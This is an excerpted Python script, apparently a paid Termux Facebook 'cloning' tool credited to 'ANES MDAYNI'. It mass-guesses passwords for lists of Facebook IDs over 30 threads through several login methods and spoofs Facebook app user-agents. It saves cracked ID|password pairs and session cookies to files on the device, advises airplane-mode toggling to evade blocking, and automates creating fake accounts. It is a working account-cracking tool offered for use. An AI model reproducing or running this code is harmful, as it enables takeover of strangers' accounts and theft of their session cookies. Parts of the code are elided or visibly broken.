...
logo=(f"""\033[1;32m
.88b  d88. d8888b.  .d8b.  db    db d8b   db d888888b 
88'YbdP`88 88  `8D d8' `8b `8b  d8' 888o  88   `88'   
88  88  88 88   88 88ooo88  `8bd8'  88V8o 88    88    
88  88  88 88   88 88~~~88    88    88 V8o88    88    
88  88  88 88  .8D 88   88    88    88  V888   .88.   
YP  YP  YP Y8888D' YP   YP    YP    VP   V8P Y888888P
 \033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m»Author  √ 𝗔𝗡𝗘𝗦 𝗠𝗗𝗔𝗬𝗡𝗜
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m»Github  √ ANES-MDAYNI213
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m»Service √ Paid
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37m»Version √ \033[1;32m1.7
 \033[1;32m••••••••••••••••••••••••••••••••••••••••••••••••••••
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in MDAYNI folder
 \033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••""")
def linex():
    print('\033[1;32m•••••••••••••••••••••••••••••••••••••••••••••••••••')
os.system('https://www.facebook.com/sou.mary.5')
def clear():
        os.system('clear')
        print(logo)
A = '\x1b[1;97m' 
...
def menu():
            clear()
        #    linex()
            print('   \33[37;42m\t Welcome MDAYNI xd MUGHAL Tool\33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                plist = []
                try:
                    ps_limit = int(input(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mHow many passwords?? '))
                except:
                    ps_limit =1
                clear()
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print(" \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCrack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;31mUse Airplane mode after 2 minutes ")
                    linex()
                    for user in fo:
                ...
                print(' MDAYNI-🖤 OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
...
def bd():
                ...
                with tred(max_workers=30) as MUGHAL:     
                        ...
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTotal id : \033[1;97m'+tl)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mSelect code :\033[1;97m '+code)
                        print(' \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mMDAYNI-🖤 Crack Has Been Running \n \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mUse Airplane after 2 minutes')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [MDAYNI-🖤-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920];[FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;];[FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;];[FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]"
                li = ['28','29','210']
                ...
                q = json.loads(po)
                if 'session_key' in q:
                    print('\r\r\033[1;32m [MDAYNI-🖤-OK] '+ids+' | '+pas+'\033[1;97m')
                    open('/sdcard/DOD/MDAYNI-🖤-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [MDAYNI-🖤-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/MDAYNI-🖤/MUGHAL-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/DOD/MDAYNI-🖤-CP.txt','a').write(ids+'|'+pas+'\n')
                        break
                else:
                    continue
            loop+=1
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [MDAYNI-🖤-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;];[FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20];[FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/DOD/MDAYNI-🖤-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DOD/MDAYNI-🖤-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [MDAYNI-🖤-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MDAYNI-🖤-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/MDAYNI-🖤/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/MDAYNI-🖤/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [MDAYNI-🖤-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MDAYNI-🖤/MDAYNI-🖤-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [MDAYNI-🖤-CREATE] OK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [MDAYNI-🖤-OK] "+uid+'|'+pas+'|'+coki)
                 linex()
                 ok+=1
                 open("/sdcard/MDAYNI-🖤/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
